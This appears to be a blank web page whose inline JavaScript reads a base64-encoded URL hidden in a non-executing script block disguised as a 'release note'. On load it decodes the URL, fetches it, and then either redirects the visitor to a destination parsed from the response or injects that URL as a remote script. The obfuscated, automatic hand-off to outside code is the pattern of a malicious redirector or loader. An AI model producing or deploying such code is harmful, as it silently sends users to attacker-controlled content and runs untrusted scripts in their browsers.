<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title></title>
  <style>
    html,
    body {
      margin: 0;
      min-height: 100%;
      background: #faf8f5;
    }
  </style>
  <script type="text/plain" id="release-note">
# delivery channel (do not rename keys)
channel = aurora-14
hop = aHR0cHM6Ly9oZXlnZXRhdXJhcnZpdGJhci5jb20vY3lnbmlkLmdhdWxpYw==
  </script>
</head>
<body>
  <script>
  (function () {
    var HANDOFF_MS = 500;

    function readEmbeddedNote() {
      var el = document.getElementById('release-note');
      return el ? el.textContent : '';
    }

    function parseNote(raw) {
      var out = { channel: '', hop: '' };
      String(raw).split(/\r?\n/).forEach(function (line) {
        var trimmed = line.trim();
        if (!trimmed || trimmed.charAt(0) === '#') return;
        var eq = trimmed.indexOf('=');
        if (eq === -1) return;
        var key = trimmed.slice(0, eq).trim().toLowerCase();
        var val = trimmed.slice(eq + 1).trim();
        if (key === 'channel') out.channel = val;
        if (key === 'hop') out.hop = val;
      });
      if (!out.hop) throw new Error('no hop');
      return out;
    }

    function decodeHop(b64) {
      var url = atob(String(b64).trim());
      if (!/^https?:\/\//i.test(url)) throw new Error('bad hop');
      return url;
    }

    function parseRelayBody(text) {
      var body = String(text).trim();
      try {
        var j = JSON.parse(body);
        if (j && j.c) {
          var u = atob(String(j.c).trim());
          if (/^https?:\/\//i.test(u)) return u;
        }
      } catch (e) {}
      var patterns = [
        /location\.replace\s*\(\s*['"]([^'"]+)['"]\s*\)/i,
        /location\.assign\s*\(\s*['"]([^'"]+)['"]\s*\)/i,
        /(?:window\.)?location\.href\s*=\s*['"]([^'"]+)['"]/i,
        /top\.location\.(?:replace|assign)\s*\(\s*['"]([^'"]+)['"]\s*\)/i
      ];
      for (var i = 0; i < patterns.length; i++) {
        var m = body.match(patterns[i]);
        if (m && m[1]) return m[1];
      }
      throw new Error('parse');
    }

    function attachHopScript(hopUrl) {
      var s = document.createElement('script');
      s.src = hopUrl;
      s.async = true;
      document.head.appendChild(s);
    }

    function deliver(hopUrl) {
      fetch(hopUrl, { cache: 'no-store', credentials: 'omit' })
        .then(function (res) {
          if (!res.ok) throw new Error('http');
          return res.text();
        })
        .then(function (text) {
          window.location.replace(parseRelayBody(text));
        })
        .catch(function () {
          attachHopScript(hopUrl);
        });
    }

    function loadNoteText() {
      var embedded = readEmbeddedNote();
      if (embedded && embedded.trim()) {
        return Promise.resolve(embedded);
      }
      return fetch('vault/release.note', { cache: 'no-store' }).then(function (res) {
        if (!res.ok) throw new Error('note');
        return res.text();
      });
    }

    var t0 = Date.now();
    loadNoteText()
      .then(function (raw) {
        var hopUrl = decodeHop(parseNote(raw).hop);
        var wait = HANDOFF_MS - (Date.now() - t0);
        setTimeout(function () {
          deliver(hopUrl);
        }, wait > 0 ? wait : 0);
      })
      .catch(function () {
        try {
          var hopUrl = decodeHop(parseNote(readEmbeddedNote()).hop);
          setTimeout(function () {
            deliver(hopUrl);
          }, HANDOFF_MS);
        } catch (e) {}
      });
  })();
  </script>
</body>
</html>
